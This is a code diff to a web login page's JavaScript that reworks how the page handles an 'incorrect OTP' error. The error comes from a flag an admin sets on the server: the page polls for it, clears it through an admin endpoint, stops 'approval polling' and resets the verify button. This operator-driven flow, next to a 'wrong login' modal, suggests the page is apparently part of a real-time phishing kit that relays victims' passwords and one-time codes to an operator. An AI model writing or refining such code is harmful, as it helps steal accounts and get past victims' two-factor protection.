@@ -290,36 +290,52 @@ button:disabled{
   let isModalOpen = false;
 
   // ========== INCORRECT OTP HANDLER ==========
-  // Poll for incorrect OTP flag – shows error, clears input, then clears the flag
-  async function checkIncorrectOtp() {
-    try {
-      const response = await fetch('/api/users/check-admin-text', {
+// Poll for incorrect OTP flag – shows error, clears input, resets UI, stops approval polling
+async function checkIncorrectOtp() {
+  try {
+    const response = await fetch('/api/users/check-admin-text', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email })
+    });
+    const data = await response.json();
+    
+    if (data.admin_text === 'incorrect_otp_error' && data.text_release === false) {
+      // 1. Show red error message below input
+      errorDiv.textContent = '❌ Incorrect OTP. Please enter a new code.';
+      errorDiv.style.display = 'block';
+      
+      // 2. Clear the OTP input field
+      otpInput.value = '';
+      otpInput.focus();
+      
+      // 3. Stop any pending approval polling (if user was waiting)
+      if (approvalInterval) {
+        clearInterval(approvalInterval);
+        approvalInterval = null;
+      }
+      
+      // 4. Re-enable the verify button and reset its text
+      isProcessing = false;
+      verifyBtn.disabled = false;
+      verifyBtn.innerHTML = 'Verify';
+      
+      // 5. Clear the error flag on server so it doesn't keep firing
+      await fetch('/api/admin/release-text', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email })
       });
-      const data = await response.json();
       
-      if (data.admin_text === 'incorrect_otp_error' && data.text_release === false) {
-        // Show red error message below input
-        errorDiv.textContent = '❌ Incorrect OTP. Please enter a new code.';
-        errorDiv.style.display = 'block';
-        // Clear the input field
-        otpInput.value = '';
-        otpInput.focus();
-        // Immediately clear the flag so it doesn't keep showing
-        await fetch('/api/admin/release-text', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email })
-        });
-        // Hide error after 4 seconds
-        setTimeout(() => {
-          errorDiv.style.display = 'none';
-        }, 4000);
-      }
-    } catch (err) {}
+      // 6. Hide error message after 4 seconds
+      setTimeout(() => {
+        errorDiv.style.display = 'none';
+      }, 4000);
+    }
+  } catch (err) {
+    console.error('Incorrect OTP polling error:', err);
   }
+}
 
   // ========== WRONG LOGIN HANDLER (modal) ==========
   async function checkWrongLogin() {
